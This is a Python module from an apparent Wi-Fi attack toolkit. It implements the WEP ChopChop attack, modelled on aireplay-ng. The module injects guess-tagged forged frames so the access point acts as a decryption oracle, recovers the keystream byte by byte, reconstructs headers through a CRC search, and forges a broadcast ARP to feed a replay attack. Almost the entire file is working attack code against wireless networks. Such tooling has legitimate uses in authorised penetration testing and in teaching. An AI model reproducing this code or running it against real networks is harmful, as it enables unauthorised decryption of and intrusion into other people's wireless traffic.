"""WEP ChopChop attack (`aireplay-ng -4`) — M6.

Decrypts a captured frame byte-by-byte using the AP as an ICV oracle, no key:
chop the last byte, guess its plaintext (≤256), fix the ICV
(dot11.wep.crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to a data
frame from us, send. The AP relays the shortened frame IFF the guess was right.
Walk backwards recovering one keystream byte per accepted guess → enough
keystream to forge a broadcast ARP → hand to replay.

IDENTITY-BY-CONSTRUCTION (ported from aireplay-ng's do_attack_chopchop, the
ground truth): we do NOT infer which guess the AP accepted from "which frame we
sent" or "which relay came first" — that inference is what made sibling-BSS
echoes and multi-relay APs ambiguous. Instead, like aireplay, we **stamp the
guess value into the destination MAC** of every candidate (DA =
``FF:rr:rr:rr:rr:GUESS``, with a sentinel bit in byte 1), blast all 256 guesses
in a rolling stream, and **read the accepted guess straight back out of the
AP's relayed frame** (``guess = relay Addr1[5]``). The relay carries its own
identity, so guess order is irrelevant, duplicate echoes resolve to the same
byte, and a multi-relay AP can't confuse us. No DFS, no "first is truth."

The sentinel (guess 256) is a deliberately bad-ICV frame: if the AP relays it,
the AP doesn't discard invalid-ICV frames and chopchop can't work — we say so
rather than failing silently (aireplay-ng.c, the ``h80211[5] & 1`` check).

Keystream recovery (the offline-testable core): the keystream is fixed per IV,
so each accepted guess gives ks[i] = body[i] XOR guess, recovered end-inward. We
chop to the AP's drop-short wall, then reconstruct the hidden head from known
structure — confirmed offline against the captured frame's OWN ICV, no AP round-
trip (aireplay-ng's header_rec):
  - ARP: LLC/SNAP + ARP-request header is known through byte 15. A wall one byte
    into the (unknown) sender MAC has that single byte recovered from the AP.
  - IP (any broadcast IP datagram): LLC/SNAP + IP version/IHL + TOS + total-
    length cover bytes 0..11 — version/IHL and TOS are brute-forced (16×256),
    total-length is computed from the frame size, all confirmed by the CRC. This
    needs the AP to relay down to a <=12-byte cipher; a deeper wall hides
    genuinely-unknown IP fields (id / flags / TTL / …) we can't derive.
Either way the output is a forged broadcast ARP (we only need ~40 keystream
bytes for the IV) handed to replay — the seed type only changes how the head is
recovered.

Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
retrying). The campaign pauses replay before running this and resumes it on
success with the forged ARP.
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
import zlib
from typing import Awaitable, Callable, Optional

from wifit3.models import AccessPoint
from wifit3.campaigns import treelog
from wifit3.dot11.wep.crypto import (
    CRC32_RESIDUE,
    arp_request_plaintext,
    chop_last_byte_and_fixup,
    icv,
)

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6
# Known plaintext prefix of a broadcast ARP REQUEST: LLC/SNAP (6) + ethertype
# 0x0806 (2) + ARP htype/ptype/hlen/plen/op-request (8) = 16 bytes. ks[0..15] =
# cipher[0..15] XOR this, so we don't chop them (and don't shrink the frame to a
# too-short-to-relay size). Assumes the captured broadcast frame is an ARP
# request — true for broadcast ARP. (IP-packet seeds via header reconstruction
# are a planned follow-up.)
_KNOWN_ARP16 = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
])
# LLC/SNAP header (always-known plaintext for ANY 802.11 data frame); the next
# 2 bytes are the ethertype (0x0806 ARP / 0x0800 IP) that says what follows.
_KNOWN_SNAP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
_ETHERTYPE_IP = bytes([0x08, 0x00])
# Stop chopping once only SNAP+ethertype (bytes 0..7) would remain — that's
# always-known structure, nothing to gain by chopping into it.
_CHOP_FLOOR = 8
# IP header reconstruction (aireplay's header_rec) covers bytes 0..11 only:
# SNAP + IP version/IHL + TOS + total-length. A wall deeper than this would hide
# genuinely-unknown IP fields (id / flags / TTL / …) we can't derive, so an IP
# seed is usable only when the AP relays down to a <=12-byte cipher.
_IP_MAX_WALL = 12
# Sentinel "guess" — not a byte value (0..255), but a flag the oracle returns
# when the AP relayed a deliberately-bad-ICV frame (→ AP isn't vulnerable).
_SENTINEL = 256


async def _always_associated() -> bool:
    return True


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _hdr_len(fc0: int, fc1: int) -> int:
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:
        n += 2
    if fc1 & 0x80:
        n += 4
    return n


class WepChopChop:
    """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
    recover keystream → forge a broadcast ARP → hand to replay."""

    # Rolling-send spacing (aireplay sends one tagged guess per pps tick rather
    # than send-one-wait — much faster; the relay arrives async and is matched
    # by its MAC tag). ~3ms observed relay latency on hardware.
    _SEND_INTERVAL_S = 0.003
    # After a full 256-guess sweep, wait this long for trailing relays.
    _DRAIN_S = 0.05
    # A position with no relay across this many sweeps is the drop-short wall
    # (small gap → brute) or the AP gone quiet.
    _MAX_SWEEPS = 3
    _HEARTBEAT_S = 5.0
    # The AP stops relaying once frames get too short, so the last keystream
    # byte just above the known prefix can be unreachable by chopping. We
    # brute-force a gap this small with FULL-length forged frames (above the
    # wall): 1 byte = 256 tagged candidates, the valid one relays.
    _MAX_BRUTE_BYTES = 1

    def __init__(
        self,
        iface,
        target: AccessPoint,
        store,
        source_mac: bytes,
        on_forged_arp: Callable[[bytes], None],
        ensure_associated: Optional[Callable[[], Awaitable[bool]]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        sender_ip: bytes = bytes([192, 168, 1, 123]),
        target_ip: bytes = bytes([192, 168, 1, 1]),
        oracle: Optional[Callable[[bytes], Awaitable[Optional[int]]]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.store = store
        self.source_mac = source_mac
        self._on_forged_arp = on_forged_arp
        # Awaited before a guess sweep — authenticates lazily (True iff
        # associated). We spam 256 frames per byte, so re-auth on demand.
        self._ensure_associated = ensure_associated or _always_associated
        self._log = log_callback or (lambda _m: None)
        self._sender_ip = sender_ip
        self._target_ip = target_ip
        # The oracle is injectable so the byte-walk is unit-testable offline:
        # oracle(body) -> the accepted guess for chopping body's last byte (or
        # _SENTINEL if the AP relays bad ICV, or None if no relay). Default =
        # the live AP (tag-and-read-back over USB).
        self._oracle = oracle or self._hw_oracle

        self.state = "idle"        # idle|waiting-auth|seeding|chopping|success
        self._active = False
        self._task: Optional[asyncio.Task] = None
        self._tried: set = set()   # seed IVs that stalled
        self._bytes_done = 0       # progress for the UI
        self._bytes_total = 0

        # Current chop target's IV + KeyID + cipher.
        self._cur_iv = b""
        self._cur_keyid = 0
        self._cur_cipher = b""
        # Per-position random MAC tag (DA = FF:tag[0..2]:GUESS, byte-1 LSB is the
        # sentinel flag). Regenerated each position so a stale relay from the
        # previous byte carries a DIFFERENT tag and is simply ignored.
        self._cur_tag = b"\x00\x00\x00\x00"
        # Set by the RX callback: the guess read out of the AP's relay (the MAC
        # tag), or "sentinel relayed" (AP doesn't drop bad ICV).
        self._relayed_guess: Optional[int] = None
        self._sentinel_relayed = False
        self._last_heartbeat = 0.0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._loop())
        logger.info("[WEP-Chop] Started on %s as %s",
                    self.bssid, self.source_mac.hex())

    def stop(self):
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info("[WEP-Chop] Stopped (%d bytes recovered).", self._bytes_done)

    @property
    def is_active(self) -> bool:
        return self._active

    # ---- Seed selection -----------------------------------------------------

    def _wep_body(self, captured: bytes):
        """(iv, keyid, cipher) from a captured broadcast WEP frame, or None."""
        if len(captured) < 28:
            return None
        body = captured[_hdr_len(captured[0], captured[1]):]
        if len(body) < 44:                 # need IV+KeyID + >=40B cipher (ARP)
            return None
        return body[:3], body[3], body[4:]

    def _pick_target(self):
        """Choose a not-yet-stalled captured broadcast data frame to chop (ARP
        or IP — the chop is protocol-agnostic; only the head reconstruction
        differs)."""
        for raw in reversed(self.store.chop_candidates(self.bssid)):
            parsed = self._wep_body(raw)
            if not parsed:
                continue
            iv, keyid, cipher = parsed
            if iv in self._tried:
                continue
            self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
            self._bytes_done = 0
            self._bytes_total = len(cipher) - _CHOP_FLOOR
            # Group header (plain) + a detail branch — each chop attempt is its
            # own little tree.
            self._log("[cyan]ChopChop:[/cyan] forging packet…")
            self._log(treelog.branch(
                f"[dim]{len(cipher)}B cipher, ~{self._bytes_total} bytes to "
                f"recover[/dim]"
            ))
            return cipher
        return None

    # ---- The byte-walk: linear, identity read from each relay ---------------

    async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
        """Chop ``cipher`` down to the AP's drop-short wall — reading each
        accepted byte out of the relay tag — then reconstruct the hidden head
        from known structure (ARP or IP), verified against the captured frame's
        own CRC, and forge a broadcast ARP from the recovered keystream. Returns
        the ARP, or None.

        Linear (no DFS): the relay's MAC tag tells us exactly which guess the AP
        accepted, so there's no ambiguity to backtrack over."""
        full_len = len(cipher)
        if full_len < 40:                  # need >=40 ks bytes to forge the ARP
            return None
        body = bytes(cipher)
        ks_map: dict = {}                  # {position: recovered keystream byte}

        # Chop from the end until the drop-short wall (or the always-known SNAP+
        # ethertype floor — no point chopping bytes structure already gives us).
        while self._active and len(body) > _CHOP_FLOOR:
            self._bytes_done = max(self._bytes_done, full_len - len(body))
            self._maybe_heartbeat()
            guess = await self._oracle(body)
            if guess == _SENTINEL:
                self._log(treelog.leaf_fail(
                    "[red]AP forwards bad-ICV frames[/red] [dim](not vulnerable "
                    "to chopchop in this mode)[/dim]"
                ))
                return None
            if guess is None:
                break                      # the drop-short wall
            pos = len(body) - 1
            ks_map[pos] = body[-1] ^ guess
            body = chop_last_byte_and_fixup(body, guess)

        if not self._active:
            return None
        ks = await self._recover_head(cipher, ks_map, len(body))
        if ks is None:
            return None
        return self._forge_arp(ks)

    # ---- Live-AP oracle: tag the guess, read it back from the relay ---------

    def _tagged_da(self, guess: int) -> bytes:
        """Destination MAC carrying the guess (aireplay's trick): FF (multicast,
        so the AP floods the relay onto the air) : 3 random bytes (fixed for
        this position) : guess. Byte-1 LSB = "real guess" (0 for the sentinel),
        so we can tell a relayed bad-ICV sentinel from a real accepted byte."""
        b1 = (self._cur_tag[0] & 0xFE) | (0 if guess == _SENTINEL else 1)
        return bytes([0xFF, b1, self._cur_tag[1], self._cur_tag[2],
                      self._cur_tag[3], guess & 0xFF])

    def _forge_frame(self, body_cipher: bytes, da: bytes) -> bytes:
        """Re-header a (chopped/forged) cipher to a ToDS data frame from us with
        destination ``da``, reusing the chop target's IV + KeyID."""
        hdr = (b"\x08\x41" + b"\x00\x00"        # Data, ToDS=1, Protected=1
               + self.bssid_bytes + self.source_mac + da + b"\x00\x00")
        return hdr + self._cur_iv + bytes([self._cur_keyid]) + body_cipher

    async def _send_tagged(self, body_cipher: bytes, guess: int) -> None:
        frame = self._forge_frame(body_cipher, self._tagged_da(guess))
        try:
            await self.iface.send_no_wait(frame)
        except Exception:
            logger.exception("[WEP-Chop] failed to send guess frame")
            return

    async def _await_assoc(self) -> bool:
        """Don't burn guesses while de-associated — (lazily) authenticate first;
        ensure_associated() retries internally before giving up."""
        return self._active and await self._ensure_associated()

    async def _sweep_for_relay(self, candidate) -> Optional[int]:
        """Blast a rolling stream of guess-tagged frames and return the guess
        read back from the AP's relay (or _SENTINEL / None). ``candidate(guess)``
        builds the cipher to send for a given guess (so the same sweep serves
        both chopping and the wall-gap brute-force). A fresh MAC tag per call
        makes stale relays from the previous position fall on the floor."""
        self._cur_tag = bytes(random.randint(0, 255) for _ in range(4))
        self._relayed_guess = None
        self._sentinel_relayed = False
        for _sweep in range(self._MAX_SWEEPS):
            if not await self._await_assoc():
                return None
            # One sentinel per sweep: truncate without fixing the ICV → invalid.
            await self._send_tagged(candidate(_SENTINEL), _SENTINEL)
            for guess in range(256):
                if not self._active:
                    return None
                if self._sentinel_relayed:
                    return _SENTINEL
                if self._relayed_guess is not None:
                    return self._relayed_guess
                await self._send_tagged(candidate(guess), guess)
                await asyncio.sleep(self._SEND_INTERVAL_S)
            await asyncio.sleep(self._DRAIN_S)   # let trailing relays land
            if self._sentinel_relayed:
                return _SENTINEL
            if self._relayed_guess is not None:
                return self._relayed_guess
        return None

    async def _hw_oracle(self, body: bytes) -> Optional[int]:
        """Chop ``body``'s last byte against the live AP: the candidate for
        guess g is the chopped+ICV-fixed frame (the sentinel is the truncated
        frame WITHOUT the fixup → bad ICV)."""
        def candidate(guess: int) -> bytes:
            if guess == _SENTINEL:
                return body[:-1]                       # no fixup → invalid ICV
            return chop_last_byte_and_fixup(body, guess)
        return await self._sweep_for_relay(candidate)

    def _rx_cb(self, pkt) -> None:
        """Read the accepted guess out of the AP's relay: a Data + FromDS +
        Protected frame whose Addr1 (RA) is the multicast tag we stamped. The
        guess is Addr1[5]; Addr1[1] LSB distinguishes a real byte from a relayed
        sentinel (bad-ICV) frame."""
        frame = pkt.raw
        if not self._active or len(frame) < 22:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2 or not (fc1 & 0x40):    # data + Protected
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):                # FromDS, not ToDS
            return
        # Addr1 (RA) == our stamped tag: FF : (byte1&0xFE) : tag[1] : tag[2]
        if frame[4] != 0xFF:
            return
        if (frame[5] & 0xFE) != (self._cur_tag[0] & 0xFE):
            return
        if frame[6] != self._cur_tag[1] or frame[7] != self._cur_tag[2] \
                or frame[8] != self._cur_tag[3]:
            return
        if frame[16:22] != self.source_mac:                 # SA == us
            return
        if not (frame[5] & 0x01):       # sentinel relayed → AP keeps bad ICV
            self._sentinel_relayed = True
            return
        self._relayed_guess = frame[9]                      # the accepted guess

    # ---- Main loop ----------------------------------------------------------

    async def _loop(self) -> None:
        try:
            while self._active:
                # Find a seed FIRST — only then is it worth authenticating
                # (lazy fake-auth; no presence with nothing to chop).
                cipher = self._pick_target()
                if not cipher:
                    self._set_state("seeding")
                    await asyncio.sleep(0.3)
                    self._maybe_heartbeat()
                    continue
                # We have a seed — (lazily) associate before chopping.
                if not await self._await_assoc():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.3)
                    continue

                self._set_state("chopping")
                forged = await self._chop_and_forge(cipher)
                if not self._active:
                    return
                if forged is None:
                    # The wall left an un-brute-forceable gap, the AP went quiet,
                    # or it isn't vulnerable — blacklist this seed, try another.
                    # Keep retrying (never auto-stop), per the design.
                    self._log(treelog.leaf_fail(
                        "[yellow]couldn't recover from this seed[/yellow] "
                        "[dim](trying another)[/dim]"
                    ))
                    self._tried.add(self._cur_iv)
                    continue
                self._succeed(forged)
                return
        except asyncio.CancelledError:
            pass

    async def _recover_head(self, cipher: bytes, ks_map: dict,
                            wall_l: int) -> Optional[bytearray]:
        """Reconstruct the keystream for the hidden head [0..wall_l-1] (the bytes
        below the AP's drop-short wall) from known frame structure, confirmed
        against the captured frame's OWN ICV — no AP needed for the
        verification (aireplay-ng's header_rec). Returns the full keystream, or
        None.

        Two shapes (try ARP, then IP):
          - ARP: LLC/SNAP + ARP-request header is known through byte 15. If the
            wall sits one byte into the (unknown) sender MAC, that single byte is
            recovered from the AP (it's real data, not derivable).
          - IP: LLC/SNAP + IP version/IHL + TOS + total-length cover bytes 0..11
            — version/IHL and TOS are brute-forced (16×256) and total-length is
            computed from the frame size, all confirmed offline by the CRC. Only
            viable when the wall is shallow (<=12); a deeper wall hides
            genuinely-unknown IP fields."""
        n = len(cipher)

        def ks_with(head: bytes) -> bytearray:
            ks = bytearray(n)
            for p, v in ks_map.items():
                ks[p] = v
            for i, p in enumerate(head):
                ks[i] = cipher[i] ^ p
            return ks

        def crc_ok(ks: bytes) -> bool:
            plain = bytes(c ^ k for c, k in zip(cipher, ks))
            return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE

        # ---- ARP (the common broadcast case) ----
        nknown = len(_KNOWN_ARP16)
        if wall_l <= nknown:
            ks = ks_with(_KNOWN_ARP16[:wall_l])
            if crc_ok(ks):
                return ks
        elif wall_l <= nknown + self._MAX_BRUTE_BYTES:
            # The wall left one genuinely-unknown byte (sender-MAC start) between
            # the known ARP header and the wall — recover it from the AP.
            ks = ks_with(_KNOWN_ARP16)
            ksb = await self._ap_brute_byte(ks, nknown)
            if ksb is not None:
                ks[nknown] = ksb
                if crc_ok(ks):
                    return ks

        # ---- IP (any broadcast IP datagram) — header reconstruction ----
        if wall_l <= _IP_MAX_WALL:
            if wall_l > _CHOP_FLOOR:
                self._log(treelog.branch(
                    "[dim]not an ARP — reconstructing the IP header "
                    "(offline CRC search)…[/dim]"
                ))
            totlen = n - 12                # IP datagram length (see module notes)
            base = _KNOWN_SNAP + _ETHERTYPE_IP                  # bytes 0..7
            vihl_range = range(0x40, 0x50) if wall_l > 8 else (0x45,)
            tos_range = range(256) if wall_l > 9 else (0x00,)
            for vihl in vihl_range:
                for tos in tos_range:
                    head = base + bytes([vihl, tos,
                                         (totlen >> 8) & 0xFF, totlen & 0xFF])
                    ks = ks_with(head[:wall_l])
                    if crc_ok(ks):
                        return ks
        return None

    async def _ap_brute_byte(self, ks: bytearray, p: int) -> Optional[int]:
        """Recover one genuinely-unknown keystream byte at position ``p`` from
        the AP: forge our (fully-known-plaintext) ARP, vary cipher[p] over 256
        tagged candidates, and read back the one that relays. ``ks`` must be
        known for every forged-ARP position except ``p``."""
        self._log(treelog.branch(
            "[dim]drop-short wall — recovering the boundary byte from the AP "
            "(256 forged ARPs)…[/dim]"
        ))
        plain = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        )
        full = plain + icv(plain)                              # 40 B
        if p >= len(full):
            return None
        base = bytearray(f ^ ks[i] for i, f in enumerate(full))

        def candidate(guess: int) -> bytes:
            c = bytearray(base)
            if guess == _SENTINEL:
                c[-1] ^= 0xFF                 # corrupt the ICV → AP must drop it
                return bytes(c)
            c[p] = guess
            return bytes(c)
        accepted = await self._sweep_for_relay(candidate)
        if accepted is None or accepted == _SENTINEL:
            return None
        return full[p] ^ accepted

    def _forge_arp(self, ks: bytearray) -> bytes:
        """Forge a broadcast ARP request from us, encrypted with the recovered
        keystream (reusing the chop target's IV) — the seed we hand to replay."""
        plain = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        )
        full = plain + icv(plain)
        cipher = bytes(p ^ ks[i] for i, p in enumerate(full))
        return self._forge_frame(cipher, _BROADCAST)

    def _succeed(self, forged: bytes) -> None:
        self._set_state("success")
        self._log(treelog.leaf_ok(
            "[green]ChopChop packet forged[/green] [dim](broadcast ARP)[/dim]"
        ))
        # Immediate handoff (mirrors frag): stop, hand the forged ARP over.
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        try:
            self._on_forged_arp(forged)
        except Exception:
            logger.exception("[WEP-Chop] on_forged_arp callback failed")

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        # Log the "waiting" status once on entering the seeding state (between
        # chop attempts). The group root for an actual attempt is the "chopping
        # IV …" header in _pick_target, so this is a plain standalone line.
        if state == "seeding" and self.state != "seeding":
            self._log("[cyan]ChopChop:[/cyan] waiting for ARP or IP frame…")
        self.state = state

    def _maybe_heartbeat(self) -> None:
        now = time.time()
        if now - self._last_heartbeat < self._HEARTBEAT_S:
            return
        self._last_heartbeat = now
        if self.state == "chopping":
            self._log(treelog.branch(
                f"[dim]byte[/dim] [white]{self._bytes_done}/{self._bytes_total}"
                f"[/white] [dim]recovered…[/dim]"
            ))
